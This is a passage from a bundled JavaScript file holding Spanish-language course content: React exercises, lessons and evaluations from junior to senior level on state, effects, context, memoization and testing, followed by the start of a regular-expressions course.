Crea un componente \`NewsletterForm\`.
*   Un input de tipo texto para el \`nombre\`.
*   Un input de tipo email para el \`correo\`.
*   Un botn de "Suscribirme".
*   Al hacer click en enviar, muestra un mensaje de xito: "Gracias [nombre], te enviaremos novedades a [correo]".
*   **Bonus:** El botn debe estar deshabilitado si alguno de los campos est vaco.

**Resultado Esperado:** Un formulario que captura datos del usuario y reacciona a su contenido.

---

## 3. Mi Lista de Compras
**Objetivo:** Renderizado de listas y keys.

**Consigna:**
Crea un componente \`ShoppingList\`.
*   Define un array inicial de objetos: \`[{ id: 1, name: 'Pan', bought: false }, ...]\`.
*   Renderiza la lista usando \`.map()\`.
*   Cada item debe mostrar su nombre.
*   **Interaccin:** Agrega un botn "Comprar" al lado de cada item. Al hacer click, el nombre de ese item debe tacharse (usando estilos condicionales).

**Resultado Esperado:** Una lista interactiva donde puedas marcar elementos como procesados.

---

## 4. Componente de Alerta Reutilizable
**Objetivo:** Props y desestructuracin.

**Consigna:**
Crea un componente llamado \`Alert\`.
*   Debe recibir tres props: \`type\` ('success' | 'warning' | 'error'), \`message\` (string) y \`onClose\` (una funcin).
*   El color de fondo debe cambiar segn el \`type\`.
*   Debe tener un botn "X" que ejecute la funcin \`onClose\` pasada por props.

**Resultado Esperado:** Un componente que puedas usar en cualquier parte de tu app pasando diferentes estilos y mensajes.

---

## 5. El Mini Gestor de Tareas (Final)
**Objetivo:** Integracin de estado, listas y formularios.

**Consigna:**
Crea una \`App\` de tareas donde el usuario pueda:
1.  Escribir una tarea en un input.
2.  Presionar "Agregar" y que se sume a una lista inferior.
3.  Poder eliminar una tarea haciendo click sobre ella.
*   Recuerda generar IDs nicos (puedes usar \`Date.now()\`).

**Resultado Esperado:** Una aplicacin funcional de To-Do que demuestre el flujo completo de datos en React.

---

A construir! 
`,completed:!1,isProject:!0},{id:"react-junior-evaluacion",title:"Evaluacin React Junior",level:"junior",content:`# Evaluacin Final: React Junior

Demuestra que dominas las bases: Componentes, Props, Estado y Listas.

## 1. Examen Terico
*   Cul es la diferencia principal entre una Prop y el Estado (State)?
*   Por qu no podemos modificar el estado directamente como \`estado = nuevoValor\`?
*   Para qu sirve la propiedad \`key\` cuando usamos \`.map()\`?

## 2. Desafo Prctico: Perfil de Usuario Dinmico
Crea un componente \`UserProfile\` que:
1. Reciba por props: \`username\`, \`email\` y \`avatarUrl\`.
2. Tenga un estado \`isFollowed\` (booleano) que inicie en \`false\`.
3. Un botn que al hacer click cambie el texto entre "Seguir" y "Siguiendo", cambiando tambin el color del botn.

## 3. Ejercicio de Listas: Gestor de Invitados
Tienes este array: \`['Ana', 'Pedro', 'Luis']\`.
1. Renderiza la lista.
2. Agrega un input para escribir un nuevo nombre.
3. Un botn "Agregar" que sume el nombre a la lista visual.

## 4. Criterios de Aprobacin
* [ ] Uso correcto de interfaces TypeScript para las Props.
* [ ] Implementacin exitosa de \`useState\`.
* [ ] Uso de \`.map()\` con \`key\` nica.
* [ ] El cdigo debe compilar sin errores de tipos.
`,completed:!1,isProject:!0},{id:"react-semi-senior-ciclo-renderizado",title:"El Ciclo de Vida y Renderizado",level:"semi-senior",content:`# Leccin 12: El Ciclo de Vida y Renderizado

Como desarrollador Semi-Senior, ya no basta con que el cdigo "funcione". Debes entender **cundo** y **por qu** React decide dibujar de nuevo.

## 1. Por qu renderiza React?
React dispara un renderizado solo en tres casos:
1.  **Cambio de Estado:** Cuando llamas a la funcin \`set\` de un \`useState\`.
2.  **Cambio de Props:** Cuando el componente padre se vuelve a renderizar.
3.  **Cambio de Contexto:** Cuando un valor en un Context cambia.

## 2. El Proceso: Render vs Commit
*   **Render phase:** React llama a tu funcin y calcula qu parte de la UI cambi (Virtual DOM). Es puro, sin efectos secundarios.
*   **Commit phase:** React aplica los cambios mnimos necesarios al DOM real.

## 3. Error Comn: Bucles Infinitos
Un error de principiante es modificar el estado directamente en el cuerpo de la funcin.

\`\`\`tsx
//  INCORRECTO: Bucle infinito
function MyComponent() {
  const [data, setData] = useState(0);
  setData(data + 1); // Dispara render -> ejecuta funcin -> dispara render...
  return <div>{data}</div>;
}
\`\`\`

## 4. Estabilidad de Referencia
En React, si creas un objeto o funcin dentro del componente, es una **nueva referencia** en cada renderizado. Esto puede romper optimizaciones o disparar efectos innecesarios.

\`\`\`tsx
//  Cuidado: Este objeto se crea de nuevo cada vez
const config = { api: 'xyz' };
\`\`\`

---

## Mini Ejercicio
Si un componente padre tiene un estado que cambia cada segundo, se vuelven a renderizar sus hijos si sus props no cambian? Investiga sobre "React.memo" brevemente.
`,completed:!1},{id:"react-semi-senior-use-effect-profundidad",title:"useEffect en Profundidad",level:"semi-senior",content:`# Leccin 13: useEffect en Profundidad

\`useEffect\` es el Hook ms incomprendido. No es un "evento de carga", es un mecanismo de **sincronizacin**.

## 1. La Anatoma del Efecto
\`\`\`tsx
useEffect(() => {
  // 1. Ejecucin del efecto
  return () => {
    // 2. Funcin de limpieza (Cleanup)
  };
}, [dependencias]); // 3. Array de dependencias
\`\`\`

## 2. Diferentes Comportamientos
*   **Sin array:** Se ejecuta en **todos** los renders (Poco comn).
*   **Array vaco \`[]\`:** Se ejecuta solo al **montar**.
*   **Con valores \`[prop, state]\`:** Se ejecuta solo cuando esos valores cambian.

## 3. La Funcin de Limpieza (Cleanup)
Es vital para evitar "Memory Leaks" o comportamientos extraos al destruir el componente.
\`\`\`tsx
useEffect(() => {
  const timer = setInterval(() => console.log('Ping'), 1000);

  return () => clearInterval(timer); //  Limpiamos antes de irnos
}, []);
\`\`\`

## 4. El "Efecto" de la falta de dependencias
**Regla de Oro:** Si usas una variable dentro de \`useEffect\`, **debe** estar en el array de dependencias. TypeScript (con ESLint) te lo recordar.

## 5. Caso Real: Peticin de API
\`\`\`tsx
useEffect(() => {
  let isMounted = true;
  
  fetchData().then(data => {
    if (isMounted) setResponse(data);
  });

  return () => { isMounted = false; };
}, [userId]);
\`\`\`

---

## Mini Ejercicio
Crea un efecto que escuche el evento \`resize\` del navegador y guarde el ancho de la ventana en un estado. No olvides remover el listener en el cleanup.
`,completed:!1},{id:"react-semi-senior-custom-hooks",title:"Custom Hooks (Extrayendo Lgica)",level:"semi-senior",content:`# Leccin 14: Custom Hooks (Extrayendo Lgica)

Un Custom Hook es una funcin de JavaScript cuyo nombre comienza con \`use\` y que puede llamar a otros Hooks. Permite reutilizar lgica de estado entre componentes sin repetir cdigo.

## 1. Cundo crear uno?
Cuando ves que el mismo \`useState\` y \`useEffect\` se repiten en dos o tres lugares diferentes.

## 2. Ejemplo: useFetch
Imagina que muchas pginas necesitan cargar datos.

\`\`\`tsx
// hooks/useFetch.ts
function useFetch<T>(url: string) {
  const [data, setData] = useState<T | null>(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    fetch(url)
      .then(res => res.json())
      .then(json => {
        setData(json);
        setLoading(false);
      });
  }, [url]);

  return { data, loading };
}

// Uso en componente
const { data, loading } = useFetch<User[]>('/api/users');
\`\`\`

## 3. Beneficios
1.  **Limpieza:** Los componentes se enfocan solo en la UI.
2.  **Testeabilidad:** Es ms fcil testear una funcin pura de lgica que un componente visual.
3.  **Encapsulacin:** Los componentes no necesitan saber *cmo* se cargan los datos, solo los piden.

---

## Mini Ejercicio
Refactoriza la lgica de un contador (incrementar, decrementar, reset) en un custom hook llamado \`useCounter\`.
`,completed:!1},{id:"react-semi-senior-context-api",title:"Comunicacin y Context API",level:"semi-senior",content:`# Leccin 15: Comunicacin y Context API

A medida que la aplicacin crece, pasar props de un padre a un hijo de forma excesiva (**Props Drilling**) se vuelve un problema de mantenimiento.

## 1. Elevacin de Estado (Lifting State Up)
Si dos componentes hermanos necesitan compartir el mismo dato, debes mover el estado al padre comn ms cercano.

## 2. Context API: El Estado Global "Ligero"
Context permite compartir valores por todo el rbol de componentes sin pasarlos manualmente por props en cada nivel.

\`\`\`tsx
// 1. Crear el Context
const UserContext = createContext<User | null>(null);

// 2. Proveer el valor
function App() {
  return (
    <UserContext.Provider value={currentUser}>
      <Nav />
      <Main />
    </UserContext.Provider>
  );
}

// 3. Consumir el valor (En cualquier hijo)
function Profile() {
  const user = useContext(UserContext);
  return <p>{user?.name}</p>;
}
\`\`\`

## 3. Cundo NO usar Context?
Context no es para todo. Si un valor cambia muy frecuentemente (ej: un input de texto), Context provocar que **todos** los componentes que lo consumen se vuelvan a renderizar, lo que puede causar lag.

## 4. Patrn: Provider con Hook Personalizado
Es profesional envolver el \`useContext\` en un custom hook para manejar errores si el componente est fuera del proveedor.

\`\`\`tsx
export function useUser() {
  const context = useContext(UserContext);
  if (!context) throw new Error("useUser debe usarse dentro de UserProvider");
  return context;
}
\`\`\`

---

## Mini Ejercicio
Crea un \`ThemeContext\` que permita cambiar entre 'light' y 'dark' en toda la aplicacin.
`,completed:!1},{id:"react-semi-senior-formularios-ss",title:"Manejo de Formularios Avanzado",level:"semi-senior",content:`# Leccin 16: Manejo de Formularios Avanzado

En el nivel Semi-Senior, dejas de usar mltiples \`useState\` para cada input de un formulario gigante.

## 1. El Objeto de Estado nico
Agrupamos los valores en un solo objeto para facilitar el manejo.

\`\`\`tsx
const [form, setForm] = useState({
  username: '',
  email: '',
  password: ''
});

const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
  const { name, value } = e.target;
  setForm({
    ...form,
    [name]: value // Usamos la llave dinmica
  });
};

<input name="username" value={form.username} onChange={handleChange} />
\`\`\`

## 2. Formularios Controlados vs No Controlados
*   **Controlados (Recomendado):** React tiene el control total. \`value\` viene del estado.
*   **No Controlados:** El DOM tiene el control. Usamos \`useRef\` para leer el valor solo cuando lo necesitamos (ej: envo). Es til para formularios muy simples o integraciones con libreras externas.

## 3. Manejo de Errores de Validacin
No confes solo en las validaciones de HTML5. Valida en el \`onSubmit\` o mediante efectos.

## 4. Libreras Populares
En proyectos reales grandes, solemos usar libreras como:
*   **React Hook Form:** Performance brutal y tipado excelente.
*   **Formik:** Basado en componentes, muy intuitivo (aunque menos popular hoy en da).

---

## Mini Ejercicio
Crea un formulario con 3 inputs y un botn. Al hacer click en el botn, muestra un \`console.table(form)\` con todos los datos.
`,completed:!1},{id:"react-semi-senior-patrones-organizacion",title:"Patrones y Estructura Organizativa",level:"semi-senior",content:`# Leccin 17: Patrones y Estructura Organizativa

Un desarrollador Semi-Senior organiza el cdigo para que sea fcil de navegar incluso meses despus.

## 1. El Patrn Contenedor-Presentacional (Bsico)
Separamos la lgica de la vista.
*   **Contenedor:** Se encarga del \`fetch\`, el estado y los clculos.
*   **Presentacional:** Es una funcin pura que recibe props y pinta la UI. No tiene \`useEffect\`.

## 2. Composicin de Componentes (\`children\`)
Evita pasar demasiadas props usando la prop especial \`children\`.

\`\`\`tsx
function Layout({ children }: { children: React.ReactNode }) {
  return (
    <div className="layout">
      <Nav />
      {children}
      <Footer />
    </div>
  );
}
\`\`\`

## 3. Estructura de Proyecto Profesional
\`\`\`
src/
  features/
    Auth/
      components/
      hooks/
      api.ts
      Auth.tsx (Main component)
  shared/
    components/ (Buttons, Inputs generales)
  context/
\`\`\`

## 4. Error Comn: Abuso de Abstraccin
No crees un componente genrico para TODO si solo lo vas a usar en un lugar. La duplicacin prematura de cdigo es peor que la duplicacin puntual. "Clean code" no significa cdigo corto, significa cdigo legible.

---

## Desafo Prctico Semi-Senior
Refactoriza una pequea aplicacin que use Props Drilling profundo (al menos 3 niveles) para que use un Context API y un Custom Hook para consumir los datos de forma segura.

---

Excelente progreso! Ahora entiendes no solo cmo usar React, sino cmo construir arquitecturas que escalan. 
`,completed:!1},{id:"react-semi-senior-evaluacion",title:"Evaluacin React Semi-Senior",level:"semi-senior",content:`# Evaluacin Final: React Semi-Senior

Enfocada en efectos secundarios, custom hooks y gestin de datos profesional.

## 1. Examen Terico
*   Explica qu sucede si omites el array de dependencias en un \`useEffect\`.
*   Cundo es preferible usar \`useReducer\` en lugar de mltiples \`useState\`?
*   Qu es el "Prop Drilling" y qu alternativas ofrece React para evitarlo?

## 2. Desafo Prctico: El Buscador de Usuarios
Crea un Custom Hook llamado \`useUsersSearch\` que:
1. Reciba una \`query\` (string).
2. Use un \`useEffect\` para filtrar una lista esttica de usuarios cada vez que la \`query\` cambie.
3. Devuelva \`{ filteredUsers, loading }\`. (Simula el loading con un \`setTimeout\` de 500ms).

## 3. Manejo de Formularios: Registro Completo
Crea un formulario con 4 campos (Nombre, Email, Password, Confirm Password).
1. Implementa una validacin: el Password debe tener al menos 6 caracteres y coincidir con el campo de confirmacin.
2. Muestra los errores en tiempo real debajo de cada input.
3. El botn de envo debe estar deshabilitado hasta que todo sea vlido.

## 4. Criterios de Aprobacin
* [ ] Correcta separacin de lgica en Custom Hooks.
* [ ] Uso eficiente de \`useEffect\` con limpieza (cleanup) si es necesario.
* [ ] Manejo de mltiples campos en un solo objeto de estado.
* [ ] Tipado estricto de eventos y estados complejos.
`,completed:!1,isProject:!0},{id:"react-senior-reconciliacion",title:"Reconciliacin y el Algoritmo de Diferenciacin (Diffing)",level:"senior",content:`# Leccin 18: Reconciliacin y el Algoritmo de Diferenciacin (Diffing)

A nivel Senior, no solo sabes que React es rpido; sabes **exactamente** cmo decide qu pxeles cambiar.

## 1. El Algoritmo de Diffing
React asume dos cosas para ser eficiente (O(n)):
1.  Dos elementos de diferentes tipos producirn rboles diferentes.
2.  El desarrollador puede indicar qu elementos son estables entre renders usando la prop \`key\`.

## 2. Comparacin de Elementos
*   **Diferente Tipo:** Si cambias de \`<div>\` a \`<span>\`, React destruye todo el rbol viejo y construye uno nuevo desde cero. Se pierde todo el estado de los hijos.
*   **Mismo Tipo:** React solo actualiza los atributos que cambiaron (ej: \`className\` o \`title\`) y mantiene la instancia del componente y su estado.

## 3. Por qu las keys son vitales?
Sin keys, si insertas un elemento al principio de una lista, React pensar que todos los elementos cambiaron. Con keys, React simplemente los reordena.

## 4. Pregunta de Entrevista Senior
**P:** "Qu sucede si uso \`Math.random()\` como key?"
**R:** En cada render, la key ser diferente. React pensar que el componente es completamente nuevo, lo destruir y lo volver a montar, perdiendo el estado y destruyendo la performance.

## 5. El Fiber Architecture
Desde React 16, el motor se llama **Fiber**. Su gran avance es la capacidad de **pausar, abortar o reutilizar** el trabajo de renderizado. Esto permite que las actualizaciones de alta prioridad (como escribir en un input) no se bloqueen por renderizados pesados.

---

## Desafo Tcnico
Investiga qu es el "Hydration Error" en aplicaciones que usan SSR (Server-Side Rendering) y cmo el algoritmo de reconciliacin maneja la diferencia entre el HTML del servidor y el del cliente.
`,completed:!1},{id:"react-senior-memoization",title:"Estrategias de Memoization",level:"senior",content:`# Leccin 19: Estrategias de Memoization

La optimizacin prematura es la raz de todos los males, pero la falta de optimizacin en aplicaciones grandes es un suicidio tcnico.

## 1. React.memo
Evita que un componente se re-renderice si sus props no han cambiado (comparacin superficial).

\`\`\`tsx
const ExpensiveComponent = React.memo(({ data }) => {
  return <div>{/* Mucho clculo aqu */}</div>;
});
\`\`\`

## 2. useMemo
Memoriza el **resultado** de un clculo costoso.
\`\`\`tsx
const filteredData = useMemo(() => {
  return bigData.filter(item => item.active);
}, [bigData]); // Solo se recalcula si bigData cambia
\`\`\`

## 3. useCallback
Memoriza una **instancia de funcin**. Evita romper el \`React.memo\` de los hijos que reciben funciones como props.

\`\`\`tsx
const handleClick = useCallback(() => {
  console.log("Click!");
}, []); // La referencia de la funcin es la misma en cada render
\`\`\`

## 4. El Costo de la Memoizacin
No memoices todo. \`useMemo\` y \`useCallback\` tienen un costo de memoria y procesamiento (comparar el array de dependencias). salos solo cuando:
1.  El clculo es realmente pesado.
2.  La estabilidad de la referencia es necesaria para evitar re-renders en cadena.

## 5. Pregunta de Entrevista
**P:** "Por qu \`[ ] === [ ]\` es falso y cmo afecta esto a las dependencias de un useEffect?"
**R:** Por la equidad referencial de JS. Si pasas un array literal como prop, React pensar que es nuevo siempre. \`useMemo\` ayuda a mantener esa referencia estable.

---

## Desafo
Crea una lista de 1000 elementos y usa el Profiler de React DevTools para medir la diferencia de tiempo de renderizado con y sin \`React.memo\`.
`,completed:!1},{id:"react-senior-performance",title:"Performance y Patrones Avanzados",level:"senior",content:`# Leccin 20: Performance y Patrones Avanzados

Optimizar React es a menudo un juego de "empujar" el estado hacia abajo o usar tcnicas de composicin.

## 1. Composicin vs Props (Slot Pattern)
En lugar de pasar props a travs de muchos niveles, pasa componentes ya renderizados.

\`\`\`tsx
//  Props Drilling
<Parent data={data}><Child data={data} /></Parent>

//  Composition: Parent no sabe qu renderiza, solo dnde
<Parent>
  <Child data={data} />
</Parent>
\`\`\`

## 2. Windowing (Virtualizacin)
Si tienes 10,000 elementos, no renderices 10,000 nodos DOM. Usa libreras como \`react-window\` para renderizar solo los que son visibles en el viewport.

## 3. Lazy Loading & Code Splitting
Divide tu aplicacin en trozos ms pequeos para mejorar la carga inicial (LCP).

\`\`\`tsx
const AdminPanel = React.lazy(() => import('./AdminPanel'));

function App() {
  return (
    <Suspense fallback={<Loading />}>
      <AdminPanel />
    </Suspense>
  );
}
\`\`\`

## 4. Concurrent Rendering (useTransition)
Permite marcar actualizaciones como "no urgentes". til para filtrados pesados mientras el usuario escribe.

\`\`\`tsx
const [isPending, startTransition] = useTransition();

const handleFilter = (e) => {
  startTransition(() => {
    setFilteredList(hugeList.filter(...));
  });
};
\`\`\`

## 5. Errores Crticos reales
**Caso:** Un desarrollador puso un \`Context.Provider\` en el nivel de \`App\` que contena el \`text\` de un search bar.
**Consecuencia:** Cada letra escrita haca que TODA la aplicacin (incluyendo el pesado Dashboard) se re-renderizara.
**Solucin:** Mover ese estado a un Context ms pequeo o usar una librera de estado atmico como **Zustand**.

---

## Desafo
Implementa una bsqueda con \`useDeferredValue\` y explica por qu mejora la fluidez de la interfaz en comparacin con un estado normal.
`,completed:!1},{id:"react-senior-arquitectura-senior",title:"Arquitectura de Componentes y Diseo de Sistemas",level:"senior",content:`# Leccin 21: Arquitectura de Componentes y Diseo de Sistemas

Escribir componentes es fcil; disear un **Sistema de Componentes** que sobreviva 3 aos es difcil.

## 1. Compound Components (Componentes Compuestos)
Un patrn para componentes que necesitan compartir un estado interno (ej: Tabs, Selects).

\`\`\`tsx
<Tabs defaultValue="home">
  <Tabs.List>
    <Tabs.Trigger value="home">Home</Tabs.Trigger>
  </Tabs.List>
  <Tabs.Content value="home">...</Tabs.Content>
</Tabs>
\`\`\`
Este patrn evita el "Props Drilling" y hace que la API del componente sea muy declarativa.

## 2. Headless UI
El concepto de separar la **lgica y accesibilidad** de los **estilos**. Libreras como \`Radix UI\` o \`React Aria\` te dan la lgica, t pones la UI. Esto es clave en Design Systems maduros.

## 3. Arquitectura de Carpetas: Feature-Based
En aplicaciones grandes, dejar de organizar por "tipo de archivo" (components, hooks) y organizar por **dominios de negocio** (Auth, Billing, Inventory).

## 4. Inversin de Control
En lugar de que tu componente tome todas las decisiones, deja que el usuario del componente pase la lgica necesaria.

\`\`\`tsx
//  Rgido
<Table data={data} showPagination />

//  Flexible (Inversin de control)
<Table 
  data={data} 
  renderFooter={(meta) => <CustomPagination {...meta} />} 
/>
\`\`\`

## 5. Pregunta Senior
**P:** "Cmo manejas la versin de un componente que necesita un cambio que rompe la compatibilidad (breaking change) en un monorepo?"
**R:** Estrategias de deprecacin, creacin de \`V2\` y migracin progresiva. Un arquitecto senior nunca rompe la produccin del equipo de un da para otro.

---

## Desafo
Disea la API de un componente \`Modal\` usando el patrn de Compound Components. Debe incluir \`Trigger\`, \`Overlay\`, \`Content\` y \`Close\`.
`,completed:!1},{id:"react-senior-estado-avanzado",title:"Estado Avanzado y State Machines",level:"senior",content:`# Leccin 22: Estado Avanzado y State Machines

Cuando los booleanos (\`isLoading\`, \`isError\`, \`isSuccess\`) ya no son suficientes para manejar la complejidad.

## 1. El Problema de los Booleanos "Imposibles"
\`\`\`tsx
const [loading, setLoading] = useState(true);
const [error, setError] = useState(false);
const [data, setData] = useState(null);
\`\`\`
Qu pasa si \`loading\` es true pero \`error\` tambin es true? Es un estado inconsistente.

## 2. Reducers (useReducer)
Ideal cuando la lgica de un estado depende de su estado anterior o cuando tienes mltiples estados relacionados.

\`\`\`tsx
const [state, dispatch] = useReducer(reducer, initialState);
\`\`\`

## 3. Finite State Machines (FSM)
Llevar el \`useReducer\` al siguiente nivel. Definir estados finitos y transiciones vlidas. Libreras como **XState** son el estndar para flujos de trabajo muy complejos.

## 4. Server State vs Client State
No mezcles datos de la API con el estado de la UI (ej: si un dropdown est abierto).
*   **Server State:** Usa **React Query** o **SWR**. Manejan cach, reintentos y "stale-while-revalidate" automticamente.
*   **Client State:** Context o libreras atmicas (Zustand, Jotai).

## 5. Caso de Produccin: El Carrito Fantasma
**Bug:** Un usuario agrega un item, el contador sube, pero al refrescar desaparece. 
**Anlisis:** Falta de sincronizacin entre el estado local (Zustand) y el estado del servidor. 
**Solucin:** Optimistic Updates con React Query. Mostramos el cambio inmediatamente, pero si el servidor falla, hacemos rollback automticamente.

---

## Desafo
Investiga qu es "Immer" y cmo ayuda a simplificar los reducers de React cuando manejamos objetos profundamente anidados.
`,completed:!1},{id:"react-senior-errores-resiliencia",title:"Manejo de Errores y Resiliencia en Produccin",level:"senior",content:`# Leccin 23: Manejo de Errores y Resiliencia en Produccin

Una aplicacin Senior no es la que no tiene errores, sino la que sabe fallar con elegancia.

## 1. Error Boundaries
Son componentes de clase (s, la nica razn para seguir usando clases en React moderno) que capturan errores de JS en cualquier parte de su rbol de componentes hijos.

\`\`\`tsx
class MyErrorBoundary extends React.Component {
  componentDidCatch(error, info) {
    logErrorToService(error, info); // Sentry, LogRocket, etc.
  }
  render() {
    if (this.state.hasError) return <FallbackUI />;
    return this.props.children;
  }
}
\`\`\`

## 2. Granularidad de Fallos
No envuelvas toda la \`App\` en un solo Error Boundary. Si falla el widget del clima, no debera romperse el checkout de la tienda. Pon lmites de error en secciones crticas de forma independiente.

## 3. Manejo de Errores Asncronos
Los Error Boundaries **no** capturan errores en:
*   Event handlers (\`onClick\`).
*   Cdigo asncrono (\`setTimeout\`, \`fetch\`).
*   Server Side Rendering.
Para estos casos, debes usar \`try/catch\` manual o el manejo de errores de libreras como \`React Query\`.

## 4. Observabilidad: Sentry y compaa
En produccin, necesitas saber qu error tuvo el usuario. Configurar herramientas de tracking de errores y "Session Replay" es obligatorio para un Senior.

## 5. Pregunta Senior
**P:** "Cmo manejas una API que devuelve un 500 pero tu frontend espera un objeto?" 
**R:** Validando los esquemas de datos con libreras como **Zod** antes de pasarlos a los componentes. El tipado de TS es solo en compilacin; Zod te da seguridad en ejecucin.

---

## Desafo
Implementa una validacin con Zod para una respuesta de API y muestra un mensaje de error amigable si los datos no coinciden con la interfaz esperada.
`,completed:!1},{id:"react-senior-testing-senior",title:"Testing Strategies para Frontend Senior",level:"senior",content:`# Leccin 24: Testing Strategies para Frontend Senior

El testeo no es para ver si el cdigo funciona hoy, es para asegurar que no se rompa maana.

## 1. La Pirmide de Testing en React
1.  **Unit Tests (Vitest/Jest):** Funciones puras, helpers, lgica de reducers.
2.  **Integration Tests (React Testing Library):** Probar componentes interactuando. No probamos la implementacin interna, probamos la **interaccin del usuario**.
3.  **End-to-End (Playwright/Cypress):** Flujos completos (Login -> Compra -> Logout).

## 2. El Mantra de RTL
> "Cuanto ms se parezcan tus tests a la forma en que se usa el software, ms confianza te darn".

Evita testear el estado interno (\`wrapper.state()\`). Testea que si el usuario escribe en un input y pulsa un botn, aparece un texto en pantalla.

## 3. Mocking APIs (MSW)
**Mock Service Worker** es el estndar senior. En lugar de mockear \`fetch\` o \`axios\`, MSW levanta un "servidor" ficticio en el navegador del test. Esto permite que el resto del cdigo (incluyendo hooks y servicios) sea idntico al de produccin.

## 4. Visual Regression Testing
Usa herramientas como **Storybook** con Chromatic para detectar si un cambio en el CSS rompi el diseo de un componente en algn borde extrao.

## 5. Pregunta Senior
**P:** "Por qu es malo tener un coverage del 100%?"
**R:** Porque el coverage miente. Puedes tener el 100% de lneas ejecutadas pero 0% de casos de borde probados. Un Senior prioriza los caminos crticos sobre el porcentaje vaco.

---

## Desafo
Escribe un test para un componente de Login que verifique que el botn de "Enviar" se deshabilita mientras la peticin est en curso.
`,completed:!1},{id:"react-senior-evaluacion",title:"Evaluacin React Architecture & Performance",level:"senior",content:`# Evaluacin Final: React Architecture & Performance

Esta evaluacin simula una auditora tcnica de una aplicacin de gran escala.

## Seccin 1: Diagnstico de Performance

**Escenario:** Tienes un Dashboard con un grfico que se actualiza cada 500ms mediante WebSockets. El usuario nota que al escribir en el campo de bsqueda (que no tiene nada que ver con el grfico), las letras aparecen con retraso y el ventilador de la laptop se enciende.

1. Identifica las 3 posibles causas de este lag de renderizado.
2. Propn una solucin tcnica usando Hooks de React 18.
3. Explica cmo usaras el Profiler para confirmar tu hiptesis.

## Seccin 2: Diseo de Arquitectura

**Escenario:** Debes disear un sistema de notificaciones persistente (como el de Facebook o LinkedIn). Las notificaciones deben aparecer en un contador en el Header y tambin en un panel lateral.

1. Qu estrategia de manejo de estado elegiras y por qu? (Context, Zustand, o React Query).
2. Dibuja (en texto) la jerarqua de componentes y dnde vivira la lgica de sincronizacin con el servidor.

## Seccin 3: Refactorizacin Crtica

Tienes el siguiente cdigo legacy:
\`\`\`tsx
const DataItem = ({ id }) => {
  const [item, setItem] = useState(null);
  useEffect(() => {
    fetch(\`/api/items/\${id}\`).then(r => r.json()).then(setItem);
  }, [id]);
  return <div>{item?.name}</div>;
}

const List = ({ ids }) => {
  return ids.map(id => <DataItem id={id} />);
}
\`\`\`

**Problema:** Si \`ids\` tiene 50 elementos, se disparan 50 peticiones simultneas, causando el problema de "N+1 Waterfall" en el frontend.
**Misin:** Propn un refactor senior que solucione esto (puedes sugerir cambios en la API o en el patrn de fetching).

## Seccin 4: Casos de Borde en Produccin

Explica cmo manejaras una situacin donde un componente de terceros (que no puedes modificar) lanza un error fatal solo en navegadores Safari antiguos, haciendo que toda tu app se ponga blanca.

---

## Criterios de Aprobacin
* [ ] Capacidad de diagnstico profundo del Virtual DOM y Reconciliacin.
* [ ] Dominio de patrones de composicin sobre herencia o props drilling.
* [ ] Pensamiento crtico sobre el costo/beneficio de las dependencias.
* [ ] Enfoque proactivo hacia la resiliencia y el manejo de errores.
`,completed:!1,isProject:!0}]},pv={id:"regex",title:"Expresiones Regulares (Regex)",description:"Domina el arte de buscar, validar y extraer informacin de textos masivos con precisin milimtrica.",completed:!1,track:"Especializacin para Desarrolladores",lessons:[{id:"regex-01-intro-regex",title:"Qu es Regex? El superpoder de buscar texto",level:"junior",content:`# Leccin 01: Qu es Regex? El superpoder de buscar texto

Las **Expresiones Regulares** (Regex) son una secuencia de caracteres que forma un patrn de bsqueda. Es como decirle a la computadora: "Busca algo que empiece con una letra mayscula, siga con 3 nmeros y termine con un punto".

## 1. Para qu sirven?
*   **Validacin:** Esto que escribi el usuario es realmente un email?
*   **Extraccin:** Sacar todos los nmeros de telfono de un documento de 500 pginas.
*   **Limpieza:** Borrar todos los espacios dobles de un texto.

## 2. Los Smbolos Bsicos (Literales y Metacaracteres)
*   \`abc\`: Busca exactamente las letras "abc".
*   \`.\`: Comodn. Coincide con cualquier carcter (menos salto de lnea).
*   \`\\d\`: Busca cualquier dgito (0-9).
*   \`\\w\`: Busca cualquier letra, nmero o guion bajo (carcter de palabra).
*   \`\\s\`: Busca cualquier espacio en blanco (espacios, tabs).

## 3. Anclas: El dnde
*   \`^\`: El inicio de la lnea.
*   \`$\`: El final de la lnea.

---

### Concepto Junior:
Al principio, una Regex parece un "lenguaje de marcianos" \`/\\d{3}-?\\d{3}/\`. Pero una vez que aprendes los smbolos, te das cuenta de que es la herramienta ms rpida del mundo para manipular texto.

### Ejercicio Mental 1:
Si tienes la Regex \`/hola/\`, coincidir con la palabra "Hola"? (Pista: Regex suele ser sensible a maysculas/minsculas por defecto).
|
`,completed:!1},{id:"regex-02-cuantificadores",title:"Cuantificadores y Clases de Caracteres",level:"junior",content:'# Leccin 02: Cuantificadores y Clases de Caracteres\n\nYa sabes buscar una letra o un nmero. Pero cmo buscas "varios nmeros seguidos"?\n\n## 1. Cuantificadores: Cuntos hay?\n*   `*`: Cero o ms veces.\n*   `+`: Una o ms veces.\n*   `?`: Cero o una vez (opcional).\n*   `{n}`: Exactamente `n` veces. (ej: `\\d{3}` busca 3 nmeros).\n*   `{min,max}`: Entre un mnimo y un mximo.\n\n## 2. Clases de Caracteres (Corchetes)\nPermiten definir un grupo de opciones para un solo carcter.\n*   `[aeiou]`: Cualquiera de esas vocales.\n*   `[a-z]`: Cualquier letra minscula de la A a la Z.\n*   `[A-Z0-9]`: Cualquier mayscula o nmero.\n*   `[^0-9]`: El `^` dentro de corchetes significa **negacin**. Busca cualquier cosa que NO sea un nmero.\n\n## 3. Escapado de caracteres\nQu pasa si quiero buscar un punto real `.`? Como el punto es un comodn, debemos ponerle una barra atrs: `\\.`. Esto vale para todos los smbolos especiales: `\\*`, `\\?`, `\\\\`.\n\n---\n\n### Caso Junior: Validar un ao\nPara buscar un ao (4 nmeros), usaramos `/\\d{4}/`. Si queremos que sea un ao que empiece con 1 o 2, usaramos `/[12]\\d{3}/`.\n\n### Ejercicio Prctico 2:\nEscribe una Regex que busque nmeros de telfono simples de 8 dgitos seguidos. (Ej: 44556677).\n',completed:!1},{id:"regex-03-grupos-y-lazy",title:"Grupos de Captura y Alternancia",level:"semi-senior",content:`# Leccin 03: Grupos de Captura y Alternancia

Como Semi-Senior, empiezas a extraer partes especficas del texto y crear patrones ms inteligentes.

## 1. Grupos de Captura \`()\`
Los parntesis sirven para dos cosas:
1.  **Agrupar:** Aplicar un cuantificador a varias cosas. \`(abc)+\` busca "abcabc".
